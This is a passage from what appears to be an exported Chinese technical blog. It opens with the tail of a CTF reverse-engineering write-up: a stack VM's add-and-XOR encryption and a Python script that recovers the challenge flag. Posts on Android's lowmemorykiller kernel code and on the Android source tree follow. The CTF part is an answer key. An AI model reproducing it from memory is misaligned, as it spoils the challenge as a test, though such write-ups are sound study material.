10addxorstore 10push 48store 11push 119push 19load 11addxorstore 11push 48store 12push 60push 17load 12addxorstore 12push 48store 13push 90push 5load 13addxorstore 13push 48store 14push 104push 13load 14addxorstore 14push 48store 15push 174push 19load 15addxorstore 15push 48store 16push 146push 11load 16addxorstore 16push 48store 17push 179push 5load 17addxorstore 17push 48store 18push 67push 15load 18addxorstore 18push 48store 19push 73push 11load 19addxorstore 19push 48store 20push 50push 12load 20addxorstore 20push 48store 21push 92push 19load 21addxorstore 21push 48store 22push 170push 19load 22addxorstore 22push 48store 23push 160push 9load 23addxorstore 23push 48store 24push 166push 15load 24addxorstore 24push 48store 25push 47push 8load 25addxorstore 25push 48store 26push 155push 19load 26addxorstore 26push 48store 27push 115push 9load 27addxorstore 27push 48store 28push 60push 13load 28addxorstore 28push 48store 29push 52push 12load 29addxorstore 29push 48store 30push 42push 5load 30addxorstore 30push 48store 31push 96push 19load 31addxorstore 31push 48store 32push 72push 7load 32addxorstore 32分析一下 vm 指令，这里有个相同的结构，经过分析后可以发现这是标准的栈式虚拟机，先将操作数压入栈中，然后进行运算时从栈顶取回，所以此处的 vm 加密是对输入加上一个数，再去异或一个数 push 48store 0push 176push 11load 0addxorstore 0编写 exp 得到 flag import reoutput = '''push 48store 0push 176push 11load 0addxorstore 0push 48store 1push 198push 18load 1addxorstore 1push 48store 2push 66push 5load 2addxorstore 2push 48store 3push 199push 18load 3addxorstore 3push 48store 4push 170push 14load 4addxorstore 4push 48store 5push 32push 13load 5addxorstore 5push 48store 6push 31push 14load 6addxorstore 6push 48store 7push 60push 18load 7addxorstore 7push 48store 8push 26push 13load 8addxorstore 8push 48store 9push 89push 18load 9addxorstore 9push 48store 10push 60push 17load 10addxorstore 10push 48store 11push 119push 19load 11addxorstore 11push 48store 12push 60push 17load 12addxorstore 12push 48store 13push 90push 5load 13addxorstore 13push 48store 14push 104push 13load 14addxorstore 14push 48store 15push 174push 19load 15addxorstore 15push 48store 16push 146push 11load 16addxorstore 16push 48store 17push 179push 5load 17addxorstore 17push 48store 18push 67push 15load 18addxorstore 18push 48store 19push 73push 11load 19addxorstore 19push 48store 20push 50push 12load 20addxorstore 20push 48store 21push 92push 19load 21addxorstore 21push 48store 22push 170push 19load 22addxorstore 22push 48store 23push 160push 9load 23addxorstore 23push 48store 24push 166push 15load 24addxorstore 24push 48store 25push 47push 8load 25addxorstore 25push 48store 26push 155push 19load 26addxorstore 26push 48store 27push 115push 9load 27addxorstore 27push 48store 28push 60push 13load 28addxorstore 28push 48store 29push 52push 12load 29addxorstore 29push 48store 30push 42push 5load 30addxorstore 30push 48store 31push 96push 19load 31addxorstore 31push 48store 32push 72push 7load 32addxorstore 32'''pattern = r'push\\s+(\\d+)'final = [255, 149, 26, 146, 200, 115, 150, 68, 36, 222, 185, 240, 74, 45, 4, 234, 236, 215, 62, 114, 178, 46, 205, 209, 214, 83, 233, 34, 82, 74, 67, 36, 204]matches = re.findall(pattern, output)#print(matches)for i in range(len(final)): print(chr((final[i] ^ (int(matches[i * 3 + 1]))) - int(matches[i * 3 + 2])), end='')","categories":[],"tags":[]},{"title":"lowmemorykiller原理分析","slug":"lowmemorykiller","date":"2023-10-10T07:40:53.000Z","updated":"2025-04-08T18:55:11.712Z","comments":true,"path":"lowmemorykiller/","link":"","permalink":"https://oacia.dev/lowmemorykiller/","excerpt":"","text":"# lowmemorykiller 概述 Android 的设计理念之一，便是应用程序退出，但进程还会继续存在系统以便再次启动时提高响应时间。这样的设计会带来一个问题，每个进程都有自己独立的内存地址空间，随着应用打开数量的增多，系统已使用的内存越来越大，就很有可能导致系统内存不足，那么需要一个能管理所有进程，根据一定策略来释放进程的策略，这便有了 lmk ，全称为 LowMemoryKiller (低内存杀手)，它使用 lmkd 来决定什么时机杀掉什么进程. Android 基于 Linux 的系统，其实 Linux 有类似的内存管理策略 ——OOM killer (Out Of Memory Killer), OOM 的策略更多的是用于分配内存不足时触发，将得分最高的进程杀掉。而 LowMemoryKiller 则会每隔一段时间检查一次，当系统剩余可用内存较低时，便会触发杀进程的策略，根据不同的剩余内存档位来来选择杀不同优先级的进程，而不是等到 OOM 时再来杀进程，真正 OOM 时系统可能已经处于异常状态，系统更希望的是未雨绸缪，在内存很低时来杀掉一些优先级较低的进程来保障后续操作的顺利进行。 与 lowmemorykiller 相关的源码路径 msm-google\\drivers\\staging\\android\\lowmemorykiller.c# lowmemorykiller 基本原理 /* drivers/misc/lowmemorykiller.c * * The lowmemorykiller driver lets user-space specify (指定) a set of memory thresholds (阈值) * where processes with a range of oom_score_adj values will get killed. Specify * the minimum oom_score_adj values in * /sys/module/lowmemorykiller/parameters/adj and the number of free pages in * /sys/module/lowmemorykiller/parameters/minfree. Both files take a comma * separated list of numbers in ascending order (按升序序列). * * For example, write \"0,8\" to /sys/module/lowmemorykiller/parameters/adj and * \"1024,4096\" to /sys/module/lowmemorykiller/parameters/minfree to kill * processes with a oom_score_adj value of 8 or higher when the free memory * drops below 4096 pages and kill processes with a oom_score_adj value of 0 or * higher when the free memory drops below 1024 pages. * * The driver considers memory used for caches to be free, but if a large * percentage of the cached memory is locked this can be very inaccurate (不准确) * and processes may not get killed until the normal oom killer is triggered. */所有应用进程都是从 zygote 孵化出来的，记录在 AMS 中 mLruProcesses 列表中，由 AMS 进行统一管理，AMS 中会根据进程的状态更新进程对应的 oom_adj 值，这个值会通过文件传递到 kernel 中去，kernel 有个低内存回收机制，在内存达到一定阀值时会触发清理 oom_adj 值高的进程腾出更多的内存空间，这就是 Lowmemorykiller 工作原理。 这一张图很好的表示了 lmk 的原理 但对于我的 pixel3, 内核版本 Linux4.9 来说没有 lowmemorykiller 这个模块 往下翻了翻源码，才发现原来 lowmemorykiller 已经不是一个模块了 (存疑) 并且这些阈值被硬编码在源码中，也就是说无法通过修改 /sys/module/lowmemorykiller/parameters/adj 和 /sys/module/lowmemorykiller/parameters/minfree 来改变 lowmemorykiller 的杀进程策略 解释一下这里各个值的含义：当内存低于 64MB 时，系统会杀死 adj&gt;=12 级别的进程；当内存低于 16MB 时，系统会杀死 adj&gt;=6 级别的进程… 以此类推 对于应用进程来说，需要有自身的 adj，由 AMS 负责更新。定义在 oom_adj 和 oom_score_adj 文件中： /proc/pid/oom_adj ：代表当前进程的优先级，这个优先级是 kernel 中的优先级，值越小优先级越高 /proc/pid/oom_score_adj ：这个是 AMS 上层的优先级，与 ProcessList 中的优先级对应，值越小优先级越高 前台进程的 oom_adj 为 0, oom_score_adj 也为 0, 表示不可被杀死 blueline:/ # ps -A | grep ezu0_a243 16722 994 14961560 221328 SyS_epoll_wait 0 S com.example.ezandroidblueline:/ # cat /proc/16722/oom_adj0blueline:/ # cat /proc/16722/oom_score_adj0oom_adj 和 oom_score_adj 的转换关系为 //msm-google\\drivers\\staging\\android\\lowmemorykiller.c/* * /proc/&lt;pid>/oom_score_adj set to OOM_SCORE_ADJ_MIN disables oom killing for * pid. */#define OOM_SCORE_ADJ_MIN (-1000)#define OOM_SCORE_ADJ_MAX 1000/* * /proc/&lt;pid>/oom_adj set to -17 protects from the oom killer for legacy * purposes. */#define OOM_DISABLE (-17)/* inclusive */#define OOM_ADJUST_MIN (-16)#define OOM_ADJUST_MAX 15static short lowmem_oom_adj_to_oom_score_adj(short oom_adj)&#123; if (oom_adj == OOM_ADJUST_MAX) return OOM_SCORE_ADJ_MAX; else return (oom_adj * OOM_SCORE_ADJ_MAX) / -OOM_DISABLE;&#125;# LowmemoryKiller 机制剖析 总的来说，Framework 层通过调整 adj 的值和阈值数组，输送给 kernel 中的 lmk，为 lmk 提供杀进程的依据，因为用户空间和内核空间相互隔离，就采用了文件节点进行通讯，用 socket 将 adj 的值与阈值数组传给 lmkd (5.0 之后不在由 AMS 直接与 lmk 通信，引入 lmkd 守护进程)，lmkd 将这些值写到内核节点中。lmk 通过读取这些节点，实现进程的 kill，所以整个 lmk 机制大概可分成三层。 # shrinker 机制简介 LMK 驱动通过注册 shrinker 来实现的，shrinker 是 linux kernel 标准的回收内存 page 的机制，由内核线程 kswapd 负责监控。 当内存不足时 kswapd 线程会遍历一张 shrinker 链表，并回调已注册的 shrinker 函数来回收内存 page，kswapd 还会周期性唤醒来执行内存操作。每个 zone 维护 active_list 和 inactive_list 链表，内核根据页面活动状态将 page 在这两个链表之间移动，最终通过 shrink_slab 和 shrink_zone 来回收内存页 # lowmemorykiller 初始化 注册 shrinker //msm-google\\drivers\\staging\\android\\lowmemorykiller.cstatic struct shrinker lowmem_shrinker = &#123; .scan_objects = lowmem_scan, .count_objects = lowmem_count, .seeks = DEFAULT_SEEKS * 16&#125;;static int __init lowmem_init(void)&#123; register_shrinker(&amp;lowmem_shrinker); lmk_event_init(); return 0;&#125;其中 shrinker 结构体的参数如下，当 count_objects 返回非 0 值时会触发 scan_objects 回调函数 //msm-google\\include\\linux\\shrinker.h/* * A callback you can register to apply pressure to ageable caches. * * @count_objects should return the number of freeable items in the cache. If * there are no objects to free or the number of freeable items cannot be * determined, it should return 0. No deadlock checks should be done during the * count callback - the shrinker relies on aggregating scan counts that couldn't * be executed due to potential deadlocks to be run at a later call when the * deadlock condition is no longer pending. * * @scan_objects will only be called if @count_objects returned a non-zero * value for the number of freeable objects. The callout should scan the cache * and attempt to free items from the cache. It should then return the number * of objects freed during the scan, or SHRINK_STOP if progress cannot be made * due to potential deadlocks. If SHRINK_STOP is returned, then no further * attempts to call the @scan_objects will be made from the current reclaim * context. * * @flags determine the shrinker abilities, like numa awareness */struct shrinker &#123; unsigned long (*count_objects)(struct shrinker *, struct shrink_control *sc); unsigned long (*scan_objects)(struct shrinker *, struct shrink_control *sc); int seeks; /* seeks to recreate an obj */ long batch; /* reclaim batch size, 0 = default */ unsigned long flags; /* These are for internal use */ struct list_head list; /* objs pending delete, per node */ atomic_long_t *nr_deferred;&#125;;# lowmem_count 统计缓存 //msm-google\\drivers\\staging\\android\\lowmemorykiller.cstatic unsigned long lowmem_count(struct shrinker *s, struct shrink_control *sc)&#123; return global_node_page_state(NR_ACTIVE_ANON) + global_node_page_state(NR_ACTIVE_FILE) + global_node_page_state(NR_INACTIVE_ANON) + global_node_page_state(NR_INACTIVE_FILE);&#125; ANON：匿名页，匿名代表没有后备存储，这种内存如果想回收，需要换出到硬盘上的 swap 分区； FILE：文件页，文件代表有文件对应，这种内存如果想回收，只需将有数据更新的脏页（dirty page）写回到磁盘的文件中即可。 内存的计算 = 活跃匿名页 + 活跃文件页 + 非活跃匿名页 + 非活跃文件页。 # lowmem_scan 释放缓存 //msm-google\\drivers\\staging\\android\\lowmemorykiller.cstatic unsigned long lowmem_scan(struct shrinker *s, struct shrink_control *sc)&#123; struct task_struct *tsk; struct task_struct *selected = NULL; unsigned long rem = 0; int tasksize; int i; short min_score_adj = OOM_SCORE_ADJ_MAX + 1; int minfree = 0; int selected_tasksize = 0; short selected_oom_score_adj; int array_size = ARRAY_SIZE(lowmem_adj); // 当前系统剩余内存大小，算法为：基于 free 总量去除其中作为 reserve 管理结构的部分 int other_free = global_page_state(NR_FREE_PAGES) - totalreserve_pages; // 当前系统 page cache 的大小 int other_file = global_node_page_state(NR_FILE_PAGES) - global_node_page_state(NR_SHMEM) - global_node_page_state(NR_UNEVICTABLE) - total_swapcache_pages(); if (lowmem_adj_size &lt; array_size) array_size = lowmem_adj_size; if (lowmem_minfree_size &lt; array_size) array_size = lowmem_minfree_size; // 遍历最小内存阈值，如果当前内存低于阈值，同时当前 page cache 也低于阈值， //(内存充裕时会有大量内存充当 page cache 以提高系统 IO 性能) // 则为 min_score_adj 赋值后退出 for 循环 for (i = 0; i &lt; array_size; i++) &#123; minfree = lowmem_minfree[i]; if (other_free &lt; minfree &amp;&amp; other_file &lt; minfree) &#123; min_score_adj = lowmem_adj[i]; break; &#125; &#125; lowmem_print(3, \"lowmem_scan %lu, %x, ofree %d %d, ma %hd\\n\", sc->nr_to_scan, sc->gfp_mask, other_free, other_file, min_score_adj); // 如果 min_score_adj 等于初值，则表示内存充足，退出函数 if (min_score_adj == OOM_SCORE_ADJ_MAX + 1) &#123; lowmem_print(5, \"lowmem_scan %lu, %x, return 0\\n\", sc->nr_to_scan, sc->gfp_mask); return 0; &#125; selected_oom_score_adj = min_score_adj; // 内核 RCU (Read-Copy Update) 同步机制 // 随意读，但更新数据的时候，需要先复制一份副本，在副本上完成修改，再一次性地替换旧数据 rcu_read_lock(); // 遍历系统进程，要开始杀进程了 for_each_process(tsk) &#123; struct task_struct *p; short oom_score_adj; // 内核进程，跳过 if (tsk->flags &amp; PF_KTHREAD) continue; // 对于普通用户进程来说，mm 指向虚拟地址空间的用户空间部分，而对于内核线程，mm 为 NULL。 // 内核线程和普通的进程间的区别在于内核线程没有独立的地址空间，mm 指针被设置为 NULL； // 它只在内核空间运行，从来不切换到用户空间去；并且和普通进程一样，可以被调度，也可以被抢占。 // 如果是内核线程，直接跳过 p = find_lock_task_mm(tsk); if (!p) continue; if (task_lmk_waiting(p) &amp;&amp; time_before_eq(jiffies, lowmem_deathpending_timeout)) &#123; task_unlock(p); rcu_read_unlock(); return 0; &#125; // 如果当前找到的进程的 oom_score_adj 比当前需要杀的最小优先级还低，不杀 oom_score_adj = p->signal->oom_score_adj; if (oom_score_adj &lt; min_score_adj) &#123; task_unlock(p); continue; &#125; // 获取进程的占用内存大小 (rss 值) //rss: resident set size, the non-swappend physical memory that a task has used in. tasksize = get_mm_rss(p->mm); task_unlock(p); if (tasksize &lt;= 0) continue; // 首个进程，selected 值必为 NULL if (selected) &#123; // 高优先级进程，不杀 if (oom_score_adj &lt; selected_oom_score_adj) continue; // 同优先级进程，如果该进程占用内存小于阈值，同样不杀 if (oom_score_adj == selected_oom_score_adj &amp;&amp; tasksize &lt;= selected_tasksize) continue; &#125; // 已经找到了需要 kill 的进程，更新它的 tasksize 与 oom_score_adj selected = p; selected_tasksize = tasksize; selected_oom_score_adj = oom_score_adj; lowmem_print(2, \"select '%s' (%d), adj %hd, size %d, to kill\\n\", p->comm, p->pid, oom_score_adj, tasksize); &#125; if (selected) &#123; long cache_size = other_file * (long)(PAGE_SIZE / 1024); long cache_limit = minfree * (long)(PAGE_SIZE / 1024); long free = other_free * (long)(PAGE_SIZE / 1024); task_lock(selected); // 发送 SIGKILL 信号，杀死这个进程 send_sig(SIGKILL, selected, 0); if (selected->mm) task_set_lmk_waiting(selected); task_unlock(selected); trace_lowmemory_kill(selected, cache_size, cache_limit, free); lowmem_print(1, \"Killing '%s' (%d) (tgid %d), adj %hd,\\n\" \" to free %ldkB on behalf of '%s' (%d) because\\n\" \" cache %ldkB is below limit %ldkB for oom_score_adj %hd\\n\" \" Free memory is %ldkB above reserved\\n\", selected->comm, selected->pid, selected->tgid, selected_oom_score_adj, selected_tasksize * (long)(PAGE_SIZE / 1024), current->comm, current->pid, cache_size, cache_limit, min_score_adj, free); lowmem_deathpending_timeout = jiffies + HZ; rem += selected_tasksize; get_task_struct(selected); &#125; lowmem_print(4, \"lowmem_scan %lu, %x, return %lu\\n\", sc->nr_to_scan, sc->gfp_mask, rem); rcu_read_unlock(); if (selected) &#123; handle_lmk_event(selected, selected_tasksize, min_score_adj); put_task_struct(selected); &#125; return rem;&#125;# 参考资料 Android LowMemoryKiller 原理分析 Android 进程系列第六篇 —LowmemoryKiller 机制分析 (上) Android 进程系列第七篇 —LowmemoryKiller 机制分析 (中) Android 进程系列第八篇 —LowmemoryKiller 机制分析 (下) linux 内核：一文读懂 lowmemorykiller 机制","categories":[],"tags":[]},{"title":"安卓系统源码结构","slug":"android-source-code","date":"2023-10-10T01:47:20.000Z","updated":"2025-04-08T18:55:11.452Z","comments":true,"path":"android-source-code/","link":"","permalink":"https://oacia.dev/android-source-code/","excerpt":"","text":"# 安卓系统源码下载 想要下载并编译安卓系统全部的源码，请必须预留 250G 及以上的代理空间，如果仅下载的话，150 到 200G 的空间就足够 l 下载过程中需要保持 VPN 连接稳定，否则将导致下载失败并从头下载！ # 查看 android 版本 进入代号，标记和 build 号来查看安卓系统的版本 如果是预装的系统，那么 kernel 版本和系统版本是有对应关系的，例如我给 pixel3 刷入的系统为 blueline-sp1a.210812.016.c2-factory-fa981d87 , 那么在上面提到的网址内找到该安卓系统该 build ID 所对应的安卓系统版本 android-12.0.0_r34 如图所示 # 下载 关于环境的配置请参阅这篇文章 输入如下命令来进行安卓系统源码下载，分支就选择我们之前查找到的那个分支 mkdir android-platform &amp;&amp; cd android-platformrepo init -u https://android.googlesource.com/platform/manifest -b android-12.0.0_r34 --depth=1repo sync -j4# 安卓系统源码按需下载 有的时候，我们并不需要高达一百多 G 的源码，而仅仅想要看我们感兴趣的部分的源码，这个时候我们可以进行按需下载 来到 Google git android platform, 例如我们想要看 frameworks/base 这部分的源码，那我们就全局搜索并将进入这里 在这里上面有提示我们可以用 git clone 命令来进行下载 当然直接输入命令是没有问题的，但是我们也可以去筛选我们想要的分支来进行下载 git clone https://android.googlesource.com/platform/frameworks/base -b android-12.0.0_r34 --depth=1# 安卓系统源码目录结构 # 根目录总览 |-- Makefile||-- art（Android Runtime，一种App运行模式，区别于传统的Dalvik虚拟机，旨在提高Android系统的流畅性）||-- bionic （bionic C库）||-- bootable （启动引导相关代码）||-- build （存放系统编译规则及generic等基础开发包配置）||-- cts （Android兼容性测试套件标准）||-- dalvik （dalvik JAVA虚拟机）||-- development （应用程序开发相关）||-- external （android使用的一些开源的模组）||-- frameworks （核心框架——java及C++语言）||-- hardware （部分厂家开源的硬解适配层HAL代码）||-- out （编译完成后的代码输出与此目录）||-- packages （应用程序包）||-- prebuilt （x86和arm架构下预编译的一些资源）||-- sdk （sdk及模拟器）||-- system （底层文件系统库、应用及组件——C语言）||-- vendor （厂商定制代码）# system app 相关目录为 packages/apps |-- apps （应用程序库）| |-- AlarmClock （闹钟）| |-- Bluetooth （蓝牙）| |-- Browser （浏览器）| |-- Calculator （计算器）| |-- Calendar （日历）| |-- Camera （相机）| |-- CertInstaller （在Android中安装数字签名，被调用）| |-- Contacts （拨号(调用)、联系人、通话记录）| |-- DeskClock （桌面时钟）| |-- Email （Email）| |-- Gallery （相册，和Camera类似，多了列表）| |-- Gallery3D （？3D相册）| |-- GlobalSearch （为google搜索服务，提供底层应用）| |-- GoogleSearch （google搜索）| |-- HTMLViewer （浏览器附属界面，被浏览器应用调用，同时提供存储记录功能）| |-- IM （即时通讯，为手机提供信号发送、接收、通信的服务）| |-- Launcher （登陆启动项，显示图片框架等等图形界面）| |-- Launcher2 （登陆启动项，负责应用的调用）| |-- Mms （？彩信业务）| |-- Music （音乐播放器）| |-- PackageInstaller （安装、卸载程序的响应）| |-- Phone （电话拨号程序）| |-- Provision （预设应用的状态，使能应用）| |-- Settings （开机设定，包括电量、蓝牙、设备信息、界面、wifi等）| |-- SoundRecorder （录音机，可计算存储所需空间和时间）| |-- Stk （接收和发送短信）| |-- Sync （空） -------○1| |-- Updater （空）| `-- VoiceDialer （语音识别通话）|-- inputmethods （输入法）| |-- LatinIME （拉丁文输入法）| |-- OpenWnn （OpenWnn输入法）| `-- PinyinIME （拼音输入法）|-- providers （提供器，提供应用程序、界面所需的数据）| |-- ApplicationsProvider （应用程序提供器，提供应用程序启动项、更新等）| |-- CalendarProvider （日历提供器）| |-- ContactsProvider （联系人提供器）| |-- DownloadProvider （下载管理提供器）| |-- DrmProvider （创建和更新数据库时调用）| |-- GoogleContactsProvider （联系人提供器的子类，用以同步联系人）| |-- GoogleSubscribedFeedsProvider（设置信息提供器）| |-- ImProvider （空）| |-- ManagementProvider （空）| |-- MediaProvider （媒体提供器，提供存储数据）| |-- TelephonyProvider （彩信提供器）| |-- UserDictionaryProvider （用户字典提供器，提供用户常用字字典）| `-- WebSearchProvider （空）|-- services | |-- EasService （空）| `-- LockAndWipe （空）`-- wallpapers （墙纸） |-- Basic （基本墙纸，系统内置墙纸） |-- LivePicker （选择动态壁纸） |-- MagicSmoke （壁纸特殊效果） `-- MusicVisualization （音乐可视化，图形随音乐而变化）# Java API Framework 对应的目录为 frameworks/ |--av(多媒体)| |--camera(多媒体的相关部分)| |--cmds(命令源码)| |--drm(数据保护)| |--include(头文件)| |--media(多媒体部分)| |--radio(无线射频部分)| |--services(服务部分)| |--soundtrigger(语音识别架构)| |--tools(工具包)|-- base | |-- apct-tests(性能优化测试)| |-- api（java的api接口，修改了接口文件请及时更新此目录下的文件（make update-api））| |-- cmds(重要的命令：am、app_proc等源码)| |-- core(framework层核心库)| | |--java(java库)| | |--jni(jni层)| | |--prote(协议层)| | |--res(资源文件)| | |--tests(测试工具)| |-- data（字体和声音等数据文件）| |-- docs（文档）| |-- drm(数据保护)| |-- graphics(图形相关)| |-- keystore(和数据签名证书相关)| |-- legacy-test(安全相关测试)| |-- libs（库）| | |--androidfw(fw功能库)| | |--common_time(常用功能和工具集合，缓存，包括图片缓存、预取缓存、网络缓存、公共View，即功能封装好的部件，包括下拉获得和上拉加载更多ListView、底部加载更多ScrollView、滑动一页Gallery等；常用工具类，包括网络、下载、资源操作、Shell、文件读写、Json、序列化/反序列化、随机数、集合、APK包等等)| | |--hwui (硬件渲染库)| | |--incident(事件驱动机制库)| | |--input(输入库)| | |--services(服务库)| | |--存储库| | |--usb(usb库)| |-- location（地区库）| |-- media（媒体相关库）| |-- native(native框架)| |-- nfc-extras(nfc额外框架)| |-- obex （蓝牙传输库）| |-- opengl （2D-3D加速库）| |-- packages （设置、TTS、VPN程序）| |-- proto (协议框架)| |-- rs (资源框架)| |-- sample (例子程序)| |-- sax (xml解析器)| |-- services (各种服务程序)| |-- telecomm (Telecom通信框架)| |-- telephony (电话通信框架)| |-- test-runner (测试工具相关)| |-- tests （各种测试）| |-- tools （一些叫不上名的工具）| |-- vr (虚拟现实相关)| `-- wifi （无线网络）||--compile (编译相关)| |-- libbcc (用于Linux性能监视的动态跟踪工具的库)| | |-- bcinfo(获取硬件设备信息)| | |-- gdb_plugin(gdb插件)| | |-- include（头文件）| | |-- lib（库文件）| |-- mclinker (MCLinker链接器)| | |-- include(头文件)| | |-- lib(库文件)| | |-- templates(模板)| | |-- tools(工具)| | |-- unittests(单元测试工具)| |-- slang（异常框架）||--data-binding||--ex（ex文件解析器）| |-- camera2 （相机相关）| |-- common //共有的| |-- framesequence（GIF图片工具包）| |-- photoviewer(图片预览)| |-- widget(小部件)|--hardware||--layoutlib||--minikin(Android原生字体，连体字效果)||--ml||--multidex||--native|||-- opt （可选部分）| |-- com.google.android （有个framework.jar）| |-- com.google.android.googlelogin （有个client.jar）| `-- emoji （standard message elements）||--rs||--support||--webview||--wihelm# Native C/C++ Libraries and Android runtime # Native C/C++ Libraries libc 对应根目录下的 bionic/ |-- libc （C库）| |-- arch-arm （ARM架构，包含系统调用汇编实现）| |-- arch-x86 （x86架构，包含系统调用汇编实现）| |-- bionic （由C实现的功能，架构无关）| |-- docs （文档）| |-- include （头文件）| |-- inet （？inet相关，具体作用不明）| |-- kernel （Linux内核中的一些头文件）| |-- netbsd （？nesbsd系统相关，具体作用不明）| |-- private （？一些私有的头文件）| |-- stdio （stdio实现）| |-- stdlib （stdlib实现）| |-- string （string函数实现）| |-- tools （几个工具）| |-- tzcode （时区相关代码）| |-- unistd （unistd实现）| `-- zoneinfo （时区信息）|-- libdl （libdl实现，dl是动态链接，提供访问动态链接库的功能）|-- libm （libm数学库的实现，）| |-- alpha （apaha架构）| |-- amd64 （amd64架构）| |-- arm （arm架构）| |-- bsdsrc （？bsd的源码）| |-- i386 （i386架构）| |-- i387 （i387架构？）| |-- ia64 （ia64架构）| |-- include （头文件）| |-- man （数学函数，后缀名为.3，一些为freeBSD的库文件）| |-- powerpc （powerpc架构）| |-- sparc64 （sparc64架构）| `-- src （源代码）|-- libstdc++ （libstdc++ C++实现库）| |-- include （头文件）| `-- src （源码）|-- libthread_db （多线程程序的调试器库）| `-- include （头文件）|-- linker （动态链接器）`-- arch （支持arm和x86两种架构）# Android Runtime Core Libraries 对应的是 dalvik/libcore/ Dalvik Virtual Machine 对应的是 dalvik/ |-- dalvikvm （main.c的目录）|-- dexdump （dex反汇编）|-- dexlist （List all methods in all concrete classes in a DEX file.）|-- dexopt （预验证与优化）|-- docs （文档）|-- dvz （和zygote相关的一个命令）|-- dx （dx工具，将多个java转换为dex）|-- hit （？java语言写成）|-- libcore （核心库）|-- libcore-disabled （？禁用的库）|-- libdex （dex的库）|-- libnativehelper （Support functions for Android's class libraries）|-- tests （测试代码）|-- tools （工具）`-- vm （虚拟机实现）# HAL 对应的目录为 hardware/ |-- broadcom （博通公司）| `-- wlan （无线网卡）|-- libhardware （硬件库）| |-- include （头文件）| `-- modules （Default (and possibly architecture dependents) HAL modules）| |-- gralloc （gralloc显示相关）| `-- overlay （Skeleton for the \"overlay\" HAL module.）|-- libhardware_legacy （旧的硬件库）| |-- flashlight （背光）| |-- gps （GPS）| |-- include （头文件）| |-- mount （旧的挂载器）| |-- power （电源）| |-- qemu （模拟器）| |-- qemu_tracing （模拟器跟踪）| |-- tests （测试）| |-- uevent （uevent）| |-- vibrator （震动）| `-- wifi （无线）|-- msm7k （高通7k处理器开源抽象层）| |-- boot （启动）| |-- libaudio （声音库）| |-- libaudio-qsd8k （qsd8k的声音相关库）| |-- libcamera （摄像头库）| |-- libcopybit （copybit库）| |-- libgralloc （gralloc库）| |-- libgralloc-qsd8k （qsd8k的gralloc库）| |-- liblights （背光库）| `-- librpc （RPC库）|-- ril （无线电抽象层）| |-- include （头文件）| |-- libril （库）| |-- reference-cdma-sms （cdma短信参考）| |-- reference-ril （ril参考）| `-- rild （ril后台服务程序）`-- ti （ti公司开源HAL） |-- omap3 （omap3处理器） | |-- dspbridge （DSP桥） | |-- libopencorehw （opencore硬件库） | |-- liboverlay （overlay硬件库） | |-- libstagefrighthw （stagefright硬件库） | `-- omx （omx组件） `-- wlan （无线网卡）# 其他 bootable 目录 |-- bootloader （适合各种bootloader的通用代码）| `-- legacy （估计不能直接使用，可以参考）| |-- arch_armv6 （V6架构，几个简单的汇编文件）| |-- arch_msm7k （高通7k处理器架构的几个基本驱动）| |-- include （通用头文件和高通7k架构头文件）| |-- libboot （启动库，都写得很简单）| |-- libc （一些常用的c函数）| |-- nandwrite （nandwirte函数实现）| `-- usbloader （usbloader实现）|-- diskinstaller （android镜像打包器，x86可生产iso）`-- recovery （系统恢复相关） |-- edify （升级脚本使用的edify脚本语言） |-- etc （init.rc恢复脚本） |-- minui （一个简单的UI） |-- minzip （一个简单的压缩工具） |-- mtdutils （mtd工具） |-- res （资源） | `-- images （一些图片） |-- tools （工具） `-- ota （OTA Over The Air Updates升级工具）`-- updater （升级器）build 目录 |-- core （核心编译规则）|-- history （历史记录）|-- libs | `-- host （主机端库，有android “cp”功能替换）|-- target （目标机编译对象）| |-- board （开发平台）| | |-- emulator （模拟器）| | |-- generic （通用）| | |-- idea6410 （自己添加的）| | `-- sim （最简单）| `-- product （开发平台对应的编译规则）| `-- security （密钥相关）`-- tools （编译中主机使用的工具及脚本） |-- acp （Android \"acp\" Command） |-- apicheck （api检查工具） |-- applypatch （补丁工具） |-- apriori （预链接工具） |-- atree （tree工具） |-- bin2asm （bin转换为asm工具） |-- check_prereq （检查编译时间戳工具） |-- dexpreopt （模拟器相关工具，具体功能不明） |-- droiddoc （？作用不明，java语言，网上有人说和JDK5有关） |-- fs_config （This program takes a list of files and directories） |-- fs_get_stats （获取文件系统状态） |-- iself （判断是否ELF格式） |-- isprelinked （判断是否prelinked） |-- kcm （按键相关） |-- lsd （List symbol dependencies） |-- releasetools （生成镜像的工具及脚本） |-- rgb2565 （rgb转换为565） |-- signapk （apk签名工具） |-- soslim （strip工具）`-- zipalign （zip archive alignment tool）development 目录 |-- apps （一些核心应用程序）| |-- BluetoothDebug （蓝牙调试程序）| |-- CustomLocale （自定义区域设置）| |-- Development （开发）| |-- Fallback （和语言相关的一个程序）| |-- FontLab （字库）| |-- GestureBuilder （手势动作）| |-- NinePatchLab （？）| |-- OBJViewer （OBJ查看器）| |-- SdkSetup （SDK安装器）| |-- SpareParts （高级设置）| |-- Term （远程登录）| `-- launchperf （？）|-- build （编译脚本模板）|-- cmds （有个monkey工具）|-- data （配置数据）|-- docs （文档）|-- host （主机端USB驱动等）|-- ide （集成开发环境）|-- ndk （本地开发套件——c语言开发套件）|-- pdk （Plug Development Kit）|-- samples （例程）| |-- AliasActivity （？）| |-- ApiDemos （API演示程序）| |-- BluetoothChat （蓝牙聊天）| |-- BrowserPlugin （浏览器插件）| |-- BusinessCard （商业卡）| |-- Compass （指南针）| |-- ContactManager （联系人管理器）| |-- CubeLiveWallpaper （动态壁纸的一个简单例程）| |-- FixedGridLayout （像是布局）| |-- GlobalTime （全球时间）| |-- HelloActivity （Hello）| |-- Home （Home）| |-- JetBoy （jetBoy游戏）| |-- LunarLander （貌似又是一个游戏）| |-- MailSync （邮件同步）| |-- MultiResolution （多分辨率）| |-- MySampleRss （RSS）| |-- NotePad （记事本）| |-- RSSReader （RSS阅读器）| |-- SearchableDictionary （目录搜索）| |-- SimpleJNI （JNI例程）| |-- SkeletonApp （空壳APP）| |-- Snake （snake程序）| |-- SoftKeyboard （软键盘）| |-- Wiktionary （？维基）| `-- WiktionarySimple （？维基例程）|-- scripts （脚本）|-- sdk （sdk配置）|-- simulator （？模拟器）|-- testrunner （？测试用）`-- tools （一些工具）external 目录 |-- aes （AES加密）|-- apache-http （网页服务器）|-- astl （ASTL (Android STL) is a slimmed-down version of the regular C++ STL.）|-- bison （自动生成语法分析器，将无关文法转换成C、C++）|-- blktrace （blktrace is a block layer IO tracing mechanism）|-- bluetooth （蓝牙相关、协议栈）|-- bsdiff （diff工具）|-- bzip2 （压缩工具）|-- clearsilver （html模板系统）|-- dbus （低延时、低开销、高可用性的IPC机制）|-- 